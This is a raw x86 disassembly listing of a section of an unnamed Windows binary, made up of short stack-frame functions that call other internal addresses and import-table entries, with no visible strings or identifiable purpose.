  4d107b:	call   edi
  4d107d:	add    BYTE PTR [eax],al
  4d107f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1085:	sub    esp,0x28
  4d1088:	mov    eax,0x4d30ac
  4d108d:	xor    ecx,ebx
  4d108f:	push   eax
  4d1090:	call   0x4d0f60
  4d1095:	add    esp,0x4
  4d1098:	pop    eax
  4d1099:	push   eax
  4d109a:	push   DWORD PTR [eax+0x134]
  4d10a0:	push   esi
  4d10a1:	push   DWORD PTR [eax+0x1b4]
  4d10a7:	push   edi
  4d10a8:	call   0x4d1204
  4d10ad:	add    esp,0x10
  4d10b0:	pop    eax
  4d10b1:	push   eax
  4d10b2:	call   0x4d1520
  4d10b7:	add    esp,0x4
  4d10ba:	pop    eax
  4d10bb:	add    esp,0x28
  4d10be:	pop    ebp
  4d10bf:	ret    
  4d10c0:	pop    edi
  4d10c1:	call   DWORD PTR ds:0x4d2034
  4d10c7:	call   edi
  4d10c9:	add    BYTE PTR [eax],al
  4d10cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10d1:	sub    esp,0x50
  4d10d4:	lea    eax,ds:0x4d3140
  4d10da:	xor    esi,DWORD PTR [ebp-0x30]
  4d10dd:	push   eax
  4d10de:	push   DWORD PTR [eax+0x134]
  4d10e4:	push   ebx
  4d10e5:	call   0x4d1250
  4d10ea:	add    esp,0x8
  4d10ed:	pop    eax
  4d10ee:	push   eax
  4d10ef:	call   0x4d1520
  4d10f4:	add    esp,0x4
  4d10f7:	pop    eax
  4d10f8:	push   eax
  4d10f9:	mov    edi,0x0
  4d10fe:	push   edi
  4d10ff:	call   0x4d0e3c
  4d1104:	add    esp,0x4
  4d1107:	pop    eax
  4d1108:	add    esp,0x50
  4d110b:	pop    ebp
  4d110c:	ret    
  4d110d:	add    BYTE PTR [eax],al
  4d110f:	add    BYTE PTR [edi-0x1],bl
  4d1112:	adc    eax,0x4d2074
  4d1117:	call   edi
  4d1119:	add    BYTE PTR [eax],al
  4d111b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1121:	sub    esp,0x44
  4d1124:	lea    eax,[edi+0x174]
  4d112a:	sub    DWORD PTR [ebp-0x40],0xffffffbb
  4d112e:	push   eax
  4d112f:	mov    edx,0x0
  4d1134:	push   edx
  4d1135:	call   0x4d0d8c
  4d113a:	add    esp,0x4
  4d113d:	pop    eax
  4d113e:	push   eax
  4d113f:	push   DWORD PTR [eax+0x1c4]
  4d1145:	push   DWORD PTR [eax+0xa8]
  4d114b:	call   0x4d072c
  4d1150:	add    esp,0x8
  4d1153:	pop    eax
  4d1154:	push   eax
  4d1155:	push   0x0
  4d1157:	call   0x4d0768
  4d115c:	add    esp,0x4
  4d115f:	pop    eax
  4d1160:	add    esp,0x44
  4d1163:	pop    ebp
  4d1164:	ret    
  4d1165:	add    BYTE PTR [eax],al
  4d1167:	add    BYTE PTR [edi-0x1],bl
  4d116a:	adc    eax,0x4d2064
  4d116f:	call   edi
  4d1171:	add    BYTE PTR [eax],al
  4d1173:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1179:	sub    esp,0x1c
  4d117c:	lea    edi,ds:0x4d3190
  4d1182:	and    DWORD PTR [edi+0x28],0x49
  4d1186:	push   edi
  4d1187:	push   eax
  4d1188:	push   eax
  4d1189:	push   edx
  4d118a:	push   DWORD PTR [edi+0x158]
  4d1190:	call   0x4d0e54
  4d1195:	add    esp,0x10
  4d1198:	pop    edi
  4d1199:	push   edi
  4d119a:	mov    edx,0x0
  4d119f:	push   edx
  4d11a0:	call   0x4d1308
  4d11a5:	add    esp,0x4
  4d11a8:	pop    edi
  4d11a9:	push   edi
  4d11aa:	call   0x4d0ae8
  4d11af:	add    esp,0x4
  4d11b2:	pop    edi
  4d11b3:	add    esp,0x1c
  4d11b6:	pop    ebp
  4d11b7:	ret    
  4d11b8:	mov    edi,edi
  4d11ba:	push   ebp
  4d11bb:	mov    ebp,esp
  4d11bd:	sub    esp,0x44
  4d11c0:	mov    ecx,0x4d31b8
  4d11c5:	cmp    ecx,0x743f
  4d11cb:	je     0x4d11bb
  4d11cd:	push   ecx
  4d11ce:	call   0x4d1520
  4d11d3:	add    esp,0x4
  4d11d6:	pop    ecx
  4d11d7:	push   ecx
  4d11d8:	push   DWORD PTR [ecx+0x88]
  4d11de:	push   DWORD PTR [ecx+0xf4]
  4d11e4:	call   0x4d1018
  4d11e9:	add    esp,0x8
  4d11ec:	pop    ecx
  4d11ed:	push   ecx
  4d11ee:	mov    esi,0x0
  4d11f3:	push   esi
  4d11f4:	call   0x4d15d8
  4d11f9:	add    esp,0x4
  4d11fc:	pop    ecx
  4d11fd:	add    esp,0x44
  4d1200:	pop    ebp
  4d1201:	ret    
  4d1202:	add    BYTE PTR [eax],al
  4d1204:	mov    edi,edi
  4d1206:	push   ebp
  4d1207:	mov    ebp,esp
  4d1209:	sub    esp,0x44
  4d120c:	mov    edi,0x4d305c
  4d1211:	add    DWORD PTR [ebp-0x40],ecx
  4d1214:	push   edi
  4d1215:	mov    edx,0x0
  4d121a:	push   edx
  4d121b:	call   0x4d100c
  4d1220:	add    esp,0x4
  4d1223:	pop    edi
  4d1224:	push   edi
  4d1225:	push   DWORD PTR [edi+0x8c]
  4d122b:	push   ecx
  4d122c:	push   esi
  4d122d:	push   DWORD PTR [edi+0x148]
  4d1233:	call   0x4d1394
  4d1238:	add    esp,0x10
  4d123b:	pop    edi
  4d123c:	push   edi
  4d123d:	push   0xfffffff4
  4d123f:	call   0x4d1000
  4d1244:	add    esp,0x4
  4d1247:	pop    edi
  4d1248:	add    esp,0x44
  4d124b:	pop    ebp
  4d124c:	ret    
  4d124d:	add    BYTE PTR [eax],al
  4d124f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1255:	sub    esp,0x54
  4d1258:	lea    ecx,[eax-0x8c]
  4d125e:	sub    edi,ebx
  4d1260:	push   ecx
  4d1261:	mov    esi,0x0
  4d1266:	push   esi
  4d1267:	call   0x4d0e3c
  4d126c:	add    esp,0x4
  4d126f:	pop    ecx
  4d1270:	push   ecx
  4d1271:	push   DWORD PTR [ecx+0x68]
  4d1274:	push   edi
  4d1275:	push   DWORD PTR [ecx+0xf4]
  4d127b:	push   DWORD PTR [ecx+0x194]
  4d1281:	call   0x4d0a40
  4d1286:	add    esp,0x10
  4d1289:	pop    ecx
  4d128a:	push   ecx
  4d128b:	mov    esi,0x0
  4d1290:	push   esi
  4d1291:	call   0x4d14ac
  4d1296:	add    esp,0x4
  4d1299:	pop    ecx
  4d129a:	add    esp,0x54
  4d129d:	pop    ebp
  4d129e:	ret    
  4d129f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12a5:	sub    esp,0x54
  4d12a8:	mov    ebx,0x4d3110
  4d12ad:	sub    edi,0x3b36
  4d12b3:	push   ebx
  4d12b4:	push   DWORD PTR [ebx+0x30]
  4d12b7:	push   DWORD PTR [ebx+0x4]
  4d12ba:	call   0x4d0d2c
  4d12bf:	add    esp,0x8
  4d12c2:	pop    ebx
  4d12c3:	mov    eax,0x0
  4d12c8:	push   eax
  4d12c9:	call   0x4d100c
  4d12ce:	add    esp,0x4
  4d12d1:	mov    ecx,0x0
  4d12d6:	push   ecx
  4d12d7:	call   0x4d15d8
  4d12dc:	add    esp,0x4
  4d12df:	add    esp,0x54
  4d12e2:	pop    ebp
  4d12e3:	ret    
  4d12e4:	pop    edi
  4d12e5:	call   DWORD PTR ds:0x4d209c
  4d12eb:	call   edi
  4d12ed:	add    BYTE PTR [eax],al
  4d12ef:	add    BYTE PTR [edi-0x1],bl
  4d12f2:	adc    eax,0x4d2038
  4d12f7:	call   edi
  4d12f9:	add    BYTE PTR [eax],al
  4d12fb:	add    BYTE PTR [edi-0x1],bl
  4d12fe:	adc    eax,0x4d2098
  4d1303:	call   edi
  4d1305:	add    BYTE PTR [eax],al
  4d1307:	add    BYTE PTR [edi-0x1],bl
  4d130a:	adc    eax,0x4d2014
  4d130f:	call   edi
  4d1311:	add    BYTE PTR [eax],al
  4d1313:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1319:	sub    esp,0x54
  4d131c:	lea    eax,ds:0x4d3018
  4d1322:	cmp    eax,0x2e0f
  4d1327:	jb     0x4d1317
  4d1329:	push   eax
  4d132a:	mov    edx,0x0
  4d132f:	push   edx
  4d1330:	call   0x4d15d8
  4d1335:	add    esp,0x4
  4d1338:	pop    eax
  4d1339:	push   eax
  4d133a:	push   edx
  4d133b:	push   DWORD PTR [eax+0xf8]
  4d1341:	push   ecx
  4d1342:	call   0x4d0954
  4d1347:	add    esp,0xc
  4d134a:	pop    eax
  4d134b:	push   eax
  4d134c:	push   0xfffffff4
  4d134e:	call   0x4d1000
  4d1353:	add    esp,0x4
  4d1356:	pop    eax
  4d1357:	add    esp,0x54
  4d135a:	pop    ebp
  4d135b:	ret    
  4d135c:	mov    edi,edi
  4d135e:	push   ebp
  4d135f:	mov    ebp,esp
  4d1361:	sub    esp,0x50
  4d1364:	mov    eax,0x4d3030
  4d1369:	or     esi,edx
  4d136b:	push   eax
  4d136c:	push   esi
  4d136d:	push   esi
  4d136e:	push   ebx
  4d136f:	call   0x4d0ed8
  4d1374:	add    esp,0xc
  4d1377:	pop    eax
  4d1378:	push   eax
  4d1379:	push   0x0
  4d137b:	call   0x4d1308
  4d1380:	add    esp,0x4
  4d1383:	pop    eax
  4d1384:	push   eax
  4d1385:	call   0x4d1520
  4d138a:	add    esp,0x4
  4d138d:	pop    eax
  4d138e:	add    esp,0x50
  4d1391:	pop    ebp
  4d1392:	ret    
  4d1393:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1399:	sub    esp,0x34
  4d139c:	lea    edx,[edi-0x44]
  4d139f:	sbb    DWORD PTR [edx+0x4c],0xffffff97
  4d13a3:	push   edx
  4d13a4:	push   DWORD PTR [edx+0x13c]
  4d13aa:	push   DWORD PTR [edx+0xb4]
  4d13b0:	call   0x4d0908
  4d13b5:	add    esp,0x8
  4d13b8:	pop    edx
  4d13b9:	push   edx
  4d13ba:	push   0x0
  4d13bc:	call   0x4d0e3c
  4d13c1:	add    esp,0x4
  4d13c4:	pop    edx
  4d13c5:	push   edx
  4d13c6:	push   0x0
  4d13c8:	call   0x4d1308
  4d13cd:	add    esp,0x4
  4d13d0:	pop    edx
  4d13d1:	add    esp,0x34
  4d13d4:	pop    ebp
  4d13d5:	ret    
  4d13d6:	add    BYTE PTR [eax],al
  4d13d8:	mov    edi,edi
  4d13da:	push   ebp
  4d13db:	mov    ebp,esp
  4d13dd:	sub    esp,0x34
  4d13e0:	lea    edi,[edx-0x88]
  4d13e6:	or     DWORD PTR [edi-0x1c],eax
  4d13e9:	push   edi
  4d13ea:	lea    edi,[edi-0xd8]
  4d13f0:	push   edi
  4d13f1:	call   0x4d1574
  4d13f6:	add    esp,0x4
  4d13f9:	test   eax,eax
  4d13fb:	jne    0x4d13ea
  4d13fd:	pop    edi
  4d13fe:	push   edi
  4d13ff:	push   ebx
  4d1400:	push   DWORD PTR [edi+0xc]
  4d1403:	push   DWORD PTR [edi+0x1d4]
  4d1409:	push   esi
  4d140a:	call   0x4d10cc
  4d140f:	add    esp,0x10
  4d1412:	pop    edi
  4d1413:	push   edi
  4d1414:	push   0x0
  4d1416:	call   0x4d15d8
  4d141b:	add    esp,0x4
  4d141e:	pop    edi
  4d141f:	add    esp,0x34
  4d1422:	pop    ebp
  4d1423:	ret    
  4d1424:	mov    edi,edi
  4d1426:	push   ebp
  4d1427:	mov    ebp,esp
  4d1429:	sub    esp,0x28
  4d142c:	mov    ebx,0x4d318c
  4d1431:	sbb    DWORD PTR [ebp-0x14],0xffffd085
  4d1438:	mov    edx,0x0
  4d143d:	push   edx
  4d143e:	call   0x4d1110
  4d1443:	add    esp,0x4
  4d1446:	push   ebx
  4d1447:	push   eax
  4d1448:	push   ecx
  4d1449:	call   0x4d1080
  4d144e:	add    esp,0x8
  4d1451:	pop    ebx
  4d1452:	call   0x4d0ae8
  4d1457:	add    esp,0x4
  4d145a:	add    esp,0x28
  4d145d:	pop    ebp
  4d145e:	ret    
  4d145f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1465:	sub    esp,0x20
  4d1468:	lea    ecx,ds:0x4d3074
  4d146e:	or     DWORD PTR [ecx+0x34],edi
  4d1471:	push   ecx
  4d1472:	mov    esi,0x0
  4d1477:	push   esi
  4d1478:	call   0x4d0e3c
  4d147d:	add    esp,0x4
  4d1480:	pop    ecx
  4d1481:	push   ecx
  4d1482:	push   edx
  4d1483:	push   edx
  4d1484:	call   0x4d0f6c
  4d1489:	add    esp,0x8
  4d148c:	pop    ecx
  4d148d:	push   ecx
  4d148e:	push   0x0
  4d1490:	call   0x4d0768
  4d1495:	add    esp,0x4
  4d1498:	pop    ecx
  4d1499:	add    esp,0x20
  4d149c:	pop    ebp
  4d149d:	ret    
  4d149e:	add    BYTE PTR [eax],al
  4d14a0:	pop    edi
  4d14a1:	call   DWORD PTR ds:0x4d2070
  4d14a7:	call   edi
  4d14a9:	add    BYTE PTR [eax],al
  4d14ab:	add    BYTE PTR [edi-0x1],bl
  4d14ae:	adc    eax,0x4d2028
  4d14b3:	call   edi
  4d14b5:	add    BYTE PTR [eax],al
  4d14b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14bd:	sub    esp,0x3c
  4d14c0:	lea    edx,[ecx-0xa4]
  4d14c6:	xor    DWORD PTR [edx+0xd0],edi
  4d14cc:	push   edx
  4d14cd:	push   DWORD PTR [edx+0x1a4]
  4d14d3:	push   DWORD PTR [edx+0x5c]
  4d14d6:	push   DWORD PTR [edx+0xe0]
  4d14dc:	push   eax
  4d14dd:	call   0x4d135c
  4d14e2:	add    esp,0x10
  4d14e5:	pop    edx
  4d14e6:	push   edx
  4d14e7:	mov    ecx,0x0
  4d14ec:	push   ecx
  4d14ed:	call   0x4d0768
  4d14f2:	add    esp,0x4
  4d14f5:	pop    edx
  4d14f6:	push   edx
  4d14f7:	push   0x0
  4d14f9:	call   0x4d0d8c
  4d14fe:	add    esp,0x4
  4d1501:	pop    edx
  4d1502:	add    esp,0x3c
  4d1505:	pop    ebp
  4d1506:	ret    
  4d1507:	add    BYTE PTR [edi-0x1],bl
  4d150a:	adc    eax,0x4d2024
  4d150f:	call   edi
  4d1511:	add    BYTE PTR [eax],al
  4d1513:	add    BYTE PTR [edi-0x1],bl
  4d1516:	adc    eax,0x4d204c
  4d151b:	call   edi
  4d151d:	add    BYTE PTR [eax],al
  4d151f:	add    BYTE PTR [edi-0x1],bl
  4d1522:	adc    eax,0x4d2048
  4d1527:	call   edi
  4d1529:	add    BYTE PTR [eax],al
  4d152b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1531:	sub    esp,0x40
  4d1534:	lea    ecx,[edi-0xac]
  4d153a:	sub    eax,ecx
  4d153c:	push   ecx
  4d153d:	push   ebx
  4d153e:	push   DWORD PTR [ecx]
  4d1540:	call   0x4d14b8
  4d1545:	add    esp,0x8
  4d1548:	pop    ecx
  4d1549:	push   ecx
  4d154a:	push   0x0
  4d154c:	call   0x4d0d8c
  4d1551:	add    esp,0x4
  4d1554:	pop    ecx
  4d1555:	push   ecx
  4d1556:	push   0x0
  4d1558:	call   0x4d1110
  4d155d:	add    esp,0x4
  4d1560:	pop    ecx
  4d1561:	add    esp,0x40
  4d1564:	pop    ebp
  4d1565:	ret    
  4d1566:	add    BYTE PTR [eax],al
  4d1568:	pop    edi
  4d1569:	call   DWORD PTR ds:0x4d2030
  4d156f:	call   edi
  4d1571:	add    BYTE PTR [eax],al
  4d1573:	add    BYTE PTR [edi-0x1],bl
  4d1576:	adc    eax,0x4d202c
  4d157b:	call   edi
  4d157d:	add    BYTE PTR [eax],al
  4d157f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1585:	sub    esp,0x58
  4d1588:	lea    ecx,[eax+0x1a0]
  4d158e:	xor    edi,0x32fd
  4d1594:	push   ecx
  4d1595:	call   0x4d1520
  4d159a:	add    esp,0x4
  4d159d:	pop    ecx
  4d159e:	push   ecx
  4d159f:	push   ebx
  4d15a0:	push   DWORD PTR [ecx+0x188]
  4d15a6:	call   0x4d1174
  4d15ab:	add    esp,0x8
  4d15ae:	pop    ecx
  4d15af:	push   ecx
  4d15b0:	lea    ecx,[ecx-0x1fc]
  4d15b6:	push   ecx
  4d15b7:	call   0x4d1574
  4d15bc:	add    esp,0x4
  4d15bf:	test   eax,eax
  4d15c1:	jne    0x4d15b0
  4d15c3:	pop    ecx
  4d15c4:	add    esp,0x58
  4d15c7:	pop    ebp
  4d15c8:	ret    
  4d15c9:	add    BYTE PTR [eax],al
  4d15cb:	add    BYTE PTR [edi-0x1],bl
  4d15ce:	adc    eax,0x4d2000
  4d15d3:	call   edi
  4d15d5:	add    BYTE PTR [eax],al
  4d15d7:	add    BYTE PTR [edi-0x1],bl
  4d15da:	adc    eax,0x4d205c
  4d15df:	call   edi
  4d15e1:	add    BYTE PTR [eax],al
  4d15e3:	add    BYTE PTR [edi-0x1],bl
  4d15e6:	adc    eax,0x4d2018
  4d15eb:	call   edi
  4d15ed:	add    BYTE PTR [eax],al
	...
